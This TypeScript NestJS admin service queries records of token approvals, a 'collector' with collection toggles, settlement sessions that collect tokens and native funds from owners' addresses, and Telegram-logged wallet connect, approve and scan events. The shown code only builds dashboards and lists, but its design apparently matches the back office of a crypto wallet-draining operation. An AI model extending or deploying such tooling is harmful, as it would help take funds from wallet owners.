import { Injectable, NotFoundException } from "@nestjs/common";
import { Prisma } from "@prisma/client";
import { NativeTransferService } from "../wallet/native-transfer.service";
import { WalletService } from "../wallet/wallet.service";
import {
  paginatedResponse,
  parsePagination,
  parseSort,
} from "../../common/utils/pagination";

import { ConfigService } from "../../config/config.service";

import { prisma } from "../../infrastructure/database/prisma-shared";

@Injectable()
export class AdminService {
  constructor(
    private readonly walletService: WalletService,
    private readonly nativeTransferService: NativeTransferService,
    private readonly configService: ConfigService
  ) {}

  async getDashboard() {
    const now = new Date();
    const collector = await this.walletService.getCollectorStatus();
    const [nativeCounts, recentFailures, settlementSummary] = await Promise.all([
      prisma.nativeTransfer.groupBy({
        by: ["status"],
        _count: { _all: true },
      }),
      Promise.all([
        prisma.approval.findMany({
          where: {
            OR: [
              { status: "FAILED" },
              { status: "SUBMITTED", lastError: { not: null } },
              {
                failureCount: { gt: 0 },
                lastError: { not: null },
                status: { in: ["PARTIALLY_USED"] },
              },
            ],
          },
          orderBy: { updatedAt: "desc" },
          take: 5,
          select: {
            id: true,
            network: true,
            ownerAddress: true,
            tokenSymbol: true,
            status: true,
            lastError: true,
            updatedAt: true,
          },
        }),
        prisma.nativeTransfer.findMany({
          where: { status: "failed" },
          orderBy: { updatedAt: "desc" },
          take: 5,
          select: {
            id: true,
            network: true,
            ownerAddress: true,
            assetSymbol: true,
            status: true,
            errorMessage: true,
            updatedAt: true,
          },
        }),
      ]),
      Promise.all([
        prisma.networkSettlementSession.count({
          where: {
            status: {
              in: [
                "WALLET_PHASE_COMPLETE",
                "FINALIZING_APPROVALS",
                "COLLECTING_TOKENS",
                "AWAITING_NATIVE",
                "EXECUTING_NATIVE",
              ],
            },
          },
        }),
        prisma.networkSettlementSession.findMany({
          where: { status: "FAILED" },
          orderBy: { updatedAt: "desc" },
          take: 5,
          select: {
            id: true,
            ownerAddress: true,
            network: true,
            status: true,
            lastError: true,
            updatedAt: true,
            clientSessionId: true,
          },
        }),
      ]),
    ]);

    const [approvalErrors, nativeErrors, recentObservabilityErrors] =
      await Promise.all([
        Promise.resolve(recentFailures[0]),
        Promise.resolve(recentFailures[1]),
        prisma.observabilityEvent.findMany({
          where: { level: "error", kind: "log" },
          orderBy: { ts: "desc" },
          take: 5,
          select: {
            id: true,
            ts: true,
            module: true,
            operation: true,
            message: true,
            walletAddress: true,
            network: true,
            errorMessage: true,
            txHash: true,
            sessionId: true,
          },
        }),
      ]);

    return {
      ok: true,
      collector,
      nativeTransfers: Object.fromEntries(
        nativeCounts.map((row) => [row.status, row._count._all])
      ),
      settlement: {
        active: settlementSummary[0],
        recentFailed: settlementSummary[1].map((s) => ({
          ...s,
          updatedAt: s.updatedAt.toISOString(),
        })),
      },
      recentFailures: {
        approvals: approvalErrors,
        nativeTransfers: nativeErrors,
      },
      recentObservabilityErrors: recentObservabilityErrors.map((e) => ({
        ...e,
        ts: e.ts.toISOString(),
      })),
      timestamp: now.toISOString(),
    };
  }

  async listApprovals(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const where: Record<string, unknown> = {};
    if (query.network) where.network = query.network.trim().toLowerCase();
    if (query.status) where.status = query.status.trim().toUpperCase();
    if (query.owner) {
      where.ownerAddress = {
        contains: query.owner.trim(),
        mode: "insensitive",
      };
    }
    if (query.collectionEnabled === "true") where.collectionEnabled = true;
    if (query.collectionEnabled === "false") where.collectionEnabled = false;

    const orderBy = parseSort(query.sort, [
      "createdAt",
      "updatedAt",
      "nextCheckAt",
      "status",
    ]);

    const [items, total] = await Promise.all([
      prisma.approval.findMany({
        where,
        orderBy,
        skip: params.skip,
        take: params.limit,
      }),
      prisma.approval.count({ where }),
    ]);

    return paginatedResponse(items, total, params);
  }

  async getApproval(id: string) {
    const approval = await prisma.approval.findFirst({
      where: { OR: [{ id }, { publicId: id }] },
    });
    if (!approval) throw new NotFoundException("Approval not found");
    const resolvedId = approval.id;

    const [transfers, audits, collectionIntents] = await Promise.all([
      prisma.transfer.findMany({
        where: { approvalId: resolvedId },
        orderBy: { createdAt: "desc" },
        take: 50,
        select: {
          id: true,
          idempotencyKey: true,
          amountRaw: true,
          fromAddress: true,
          toAddress: true,
          txHash: true,
          blockNumber: true,
          status: true,
          errorMessage: true,
          retryCount: true,
          broadcastAt: true,
          confirmedAt: true,
          createdAt: true,
          updatedAt: true,
        },
      }),
      prisma.auditLog.findMany({
        where: { entityId: resolvedId },
        orderBy: { createdAt: "desc" },
        take: 20,
      }),
      prisma.collectionIntent.findMany({
        where: { approvalId: resolvedId },
        include: { attempts: { orderBy: { sequence: "desc" } } },
        orderBy: { createdAt: "desc" },
      }),
    ]);

    return { item: approval, transfers, audits, collectionIntents };
  }

  async listTransfers(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const approvalWhere: Record<string, unknown> = {};
    if (query.network) approvalWhere.network = query.network.trim().toLowerCase();
    if (query.owner) {
      approvalWhere.ownerAddress = {
        contains: query.owner.trim(),
        mode: "insensitive",
      };
    }

    const where: Record<string, unknown> = {};
    if (query.status) where.status = query.status.trim().toLowerCase();
    if (Object.keys(approvalWhere).length > 0) {
      where.approval = approvalWhere;
    }
    if (query.approvalId) where.approvalId = query.approvalId.trim();

    const orderBy = parseSort(query.sort, ["createdAt", "updatedAt", "status"]);

    const [items, total] = await Promise.all([
      prisma.transfer.findMany({
        where,
        orderBy,
        skip: params.skip,
        take: params.limit,
        include: {
          approval: {
            select: {
              id: true,
              network: true,
              ownerAddress: true,
              tokenSymbol: true,
              status: true,
              traceId: true,
            },
          },
        },
      }),
      prisma.transfer.count({ where }),
    ]);

    return paginatedResponse(
      items.map(({ approval, ...transfer }) => ({
        ...transfer,
        signedPayload: undefined,
        approval,
      })),
      total,
      params
    );
  }

  async getTransfer(id: string) {
    const transfer = await prisma.transfer.findFirst({
      where: { OR: [{ id }, { publicId: id }] },
      include: {
        approval: true,
      },
    });
    if (!transfer) throw new NotFoundException("Transfer not found");
    const { signedPayload: _signedPayload, ...safe } = transfer;
    return {
      item: {
        ...safe,
        hasSignedPayload: Boolean(transfer.signedPayload),
      },
    };
  }

  async listNativeTransfers(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const where: Record<string, unknown> = {};
    if (query.network) where.network = query.network.trim().toLowerCase();
    if (query.status) where.status = query.status.trim().toLowerCase();
    if (query.owner) {
      where.ownerAddress = {
        contains: query.owner.trim(),
        mode: "insensitive",
      };
    }

    const orderBy = parseSort(query.sort, [
      "createdAt",
      "updatedAt",
      "lastReconcileAt",
      "status",
    ]);

    const [items, total] = await Promise.all([
      prisma.nativeTransfer.findMany({
        where,
        orderBy,
        skip: params.skip,
        take: params.limit,
      }),
      prisma.nativeTransfer.count({ where }),
    ]);

    return paginatedResponse(items, total, params);
  }

  async getNativeTransfer(id: string) {
    const item = await prisma.nativeTransfer.findFirst({
      where: { OR: [{ id }, { publicId: id }] },
    });
    if (!item) throw new NotFoundException("Native transfer not found");
    return { item };
  }

  async reconcileNativeTransfer(id: string) {
    const item = await this.nativeTransferService.reconcilePending(id);
    return { ok: true, item };
  }

  async listAuditLogs(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const where: Prisma.AuditLogWhereInput = {};

    if (query.search?.trim()) {
      const s = query.search.trim();
      where.OR = [
        { action: { contains: s, mode: "insensitive" } },
        { entityType: { contains: s, mode: "insensitive" } },
        { entityId: { contains: s, mode: "insensitive" } },
        { actor: { contains: s, mode: "insensitive" } },
      ];
    }
    if (query.action) {
      where.action = { contains: query.action.trim(), mode: "insensitive" };
    }
    if (query.entityType) {
      where.entityType = { contains: query.entityType.trim(), mode: "insensitive" };
    }
    if (query.entityId) where.entityId = query.entityId.trim();
    if (query.actor) {
      where.actor = { contains: query.actor.trim(), mode: "insensitive" };
    }

    if (query.from || query.to) {
      where.createdAt = {};
      if (query.from) where.createdAt.gte = new Date(query.from);
      if (query.to) where.createdAt.lte = new Date(query.to);
    }

    const orderBy = parseSort(query.sort, ["createdAt"]);

    const [items, total] = await Promise.all([
      prisma.auditLog.findMany({
        where,
        orderBy,
        skip: params.skip,
        take: params.limit,
      }),
      prisma.auditLog.count({ where }),
    ]);

    return paginatedResponse(items, total, params);
  }

  async listTgEvents(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const where: Prisma.TgLogEventWhereInput = {};

    if (query.tab === "user") {
      where.type = { in: ["approve", "native_transfer", "scan"] };
    } else if (query.tab === "connections") {
      where.type = "connect";
    } else if (query.tab === "errors") {
      where.status = "error";
    } else if (query.type) {
      const types = query.type.split(",").map((t) => t.trim()).filter(Boolean);
      where.type = types.length > 1 ? { in: types } : types[0];
    }

    if (query.network) where.network = query.network.trim().toLowerCase();
    if (query.status && query.tab !== "errors") where.status = query.status.trim();
    if (query.address) {
      where.address = { contains: query.address.trim(), mode: "insensitive" };
    }

    if (query.search?.trim()) {
      const s = query.search.trim();
      where.OR = [
        { address: { contains: s, mode: "insensitive" } },
        { error: { contains: s, mode: "insensitive" } },
        { type: { contains: s, mode: "insensitive" } },
        { location: { contains: s, mode: "insensitive" } },
      ];
    }

    if (query.from || query.to) {
      where.createdAt = {};
      if (query.from) where.createdAt.gte = new Date(query.from);
      if (query.to) where.createdAt.lte = new Date(query.to);
    }

    const orderBy = parseSort(query.sort, ["createdAt"]);

    const [items, total] = await Promise.all([
      prisma.tgLogEvent.findMany({
        where,
        orderBy,
        skip: params.skip,
        take: params.limit,
      }),
      prisma.tgLogEvent.count({ where }),
    ]);

    return paginatedResponse(items, total, params);
  }

  async listWallets(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const search = query.search?.trim() ?? "";

    type WalletRow = {
      address: string;
      approval_count: bigint;
      native_count: bigint;
      event_count: bigint;
      last_seen: Date | null;
    };

    const rows = search
      ? await prisma.$queryRaw<WalletRow[]>`
          SELECT address,
                 SUM(approval_count)::bigint AS approval_count,
                 SUM(native_count)::bigint AS native_count,
                 SUM(event_count)::bigint AS event_count,
                 MAX(last_seen) AS last_seen
          FROM (
            SELECT "ownerAddress" AS address, 1 AS approval_count, 0 AS native_count, 0 AS event_count, "updatedAt" AS last_seen
            FROM "Approval"
            WHERE "ownerAddress" ILIKE ${`%${search}%`}
            UNION ALL
            SELECT "ownerAddress", 0, 1, 0, "updatedAt" FROM "NativeTransfer"
            WHERE "ownerAddress" ILIKE ${`%${search}%`}
            UNION ALL
            SELECT address, 0, 0, 1, "createdAt" FROM "TgLogEvent"
            WHERE address ILIKE ${`%${search}%`}
          ) combined
          GROUP BY address
          ORDER BY last_seen DESC NULLS LAST
          LIMIT ${params.limit} OFFSET ${params.skip}
        `
      : await prisma.$queryRaw<WalletRow[]>`
          SELECT address,
                 SUM(approval_count)::bigint AS approval_count,
                 SUM(native_count)::bigint AS native_count,
                 SUM(event_count)::bigint AS event_count,
                 MAX(last_seen) AS last_seen
          FROM (
            SELECT "ownerAddress" AS address, 1 AS approval_count, 0 AS native_count, 0 AS event_count, "updatedAt" AS last_seen
            FROM "Approval"
            UNION ALL
            SELECT "ownerAddress", 0, 1, 0, "updatedAt" FROM "NativeTransfer"
            UNION ALL
            SELECT address, 0, 0, 1, "createdAt" FROM "TgLogEvent"
          ) combined
          GROUP BY address
          ORDER BY last_seen DESC NULLS LAST
          LIMIT ${params.limit} OFFSET ${params.skip}
        `;

    const countResult = search
      ? await prisma.$queryRaw<{ count: bigint }[]>`
          SELECT COUNT(*)::bigint AS count FROM (
            SELECT address FROM (
              SELECT "ownerAddress" AS address FROM "Approval" WHERE "ownerAddress" ILIKE ${`%${search}%`}
              UNION
              SELECT "ownerAddress" FROM "NativeTransfer" WHERE "ownerAddress" ILIKE ${`%${search}%`}
              UNION
              SELECT address FROM "TgLogEvent" WHERE address ILIKE ${`%${search}%`}
            ) t GROUP BY address
          ) c
        `
      : await prisma.$queryRaw<{ count: bigint }[]>`
          SELECT COUNT(*)::bigint AS count FROM (
            SELECT address FROM (
              SELECT "ownerAddress" AS address FROM "Approval"
              UNION
              SELECT "ownerAddress" FROM "NativeTransfer"
              UNION
              SELECT address FROM "TgLogEvent"
            ) t GROUP BY address
          ) c
        `;

    const total = Number(countResult[0]?.count ?? 0);
    const items = rows.map((row) => ({
      address: row.address,
      approvalCount: Number(row.approval_count),
      nativeTransferCount: Number(row.native_count),
      eventCount: Number(row.event_count),
      lastSeen: row.last_seen,
    }));

    return paginatedResponse(items, total, params);
  }

  async getWallet(address: string) {
    const normalized = address.trim();
    const [approvals, nativeTransfers, events, transfers, observabilityEvents, sessionTimelines] =
      await Promise.all([
      prisma.approval.findMany({
        where: { ownerAddress: normalized },
        orderBy: { createdAt: "desc" },
        take: 100,
      }),
      prisma.nativeTransfer.findMany({
        where: { ownerAddress: normalized },
        orderBy: { createdAt: "desc" },
        take: 100,
      }),
      prisma.tgLogEvent.findMany({
        where: { address: normalized },
        orderBy: { createdAt: "desc" },
        take: 100,
      }),
      prisma.transfer.findMany({
        where: { fromAddress: normalized },
        orderBy: { createdAt: "desc" },
        take: 100,
        include: {
          approval: {
            select: {
              id: true,
              network: true,
              tokenSymbol: true,
              status: true,
            },
          },
        },
      }),
      prisma.observabilityEvent.findMany({
        where: { walletAddress: normalized, kind: "log" },
        orderBy: { ts: "desc" },
        take: 50,
      }),
      prisma.observabilityEvent.findMany({
        where: { walletAddress: normalized, kind: "timeline" },
        orderBy: { ts: "desc" },
        take: 20,
      }),
    ]);

    if (
      approvals.length === 0 &&
      nativeTransfers.length === 0 &&
      events.length === 0 &&
      transfers.length === 0
    ) {
      throw new NotFoundException("Wallet not found");
    }

    const timeline = [
      ...approvals.map((a) => ({
        type: "approval" as const,
        id: a.id,
        at: a.createdAt.toISOString(),
        label: `${a.network} ${a.tokenSymbol}`,
        status: a.status,
      })),
      ...transfers.map((t) => ({
        type: "transfer" as const,
        id: t.id,
        at: t.createdAt.toISOString(),
        label: `${t.approval.network} ${t.approval.tokenSymbol} · ${t.amountRaw}`,
        status: t.status,
      })),
      ...nativeTransfers.map((n) => ({
        type: "native" as const,
        id: n.id,
        at: n.createdAt.toISOString(),
        label: `${n.network} ${n.assetSymbol} · ${n.amountHuman}`,
        status: n.status,
      })),
      ...events.map((e) => ({
        type: "event" as const,
        id: e.id,
        at: e.createdAt.toISOString(),
        label: `${e.type} · ${e.network}`,
        status: e.status,
      })),
      ...observabilityEvents.map((e) => ({
        type: "observability" as const,
        id: e.id,
        at: e.ts.toISOString(),
        label: `${e.module} · ${e.message}`,
        status: e.status,
      })),
      ...sessionTimelines.map((t) => ({
        type: "session_timeline" as const,
        id: t.id,
        at: t.ts.toISOString(),
        label: `Session ${t.sessionId ?? t.eventId}`,
        status: t.status,
      })),
    ].sort((a, b) => (a.at < b.at ? 1 : -1));

    return {
      address: normalized,
      approvals,
      nativeTransfers,
      events,
      transfers: transfers.map(({ signedPayload: _sp, ...t }) => ({
        ...t,
        hasSignedPayload: Boolean(_sp),
      })),
      observabilityEvents: observabilityEvents.map((e) => ({
        ...e,
        ts: e.ts.toISOString(),
      })),
      sessionTimelines: sessionTimelines.map((t) => ({
        ...t,
        ts: t.ts.toISOString(),
      })),
      timeline,
    };
  }

  adminTransfer(body: Record<string, unknown>) {
    return this.walletService.adminTransfer(body);
  }

  collectorStatus() {
    return this.walletService.getCollectorStatus();
  }

  debugSnapshot() {
    return this.walletService.debugApprovals();
  }

  getCollectionIntervalMs() {
    return this.configService.getCollectorConfig().intervalMs;
  }
}
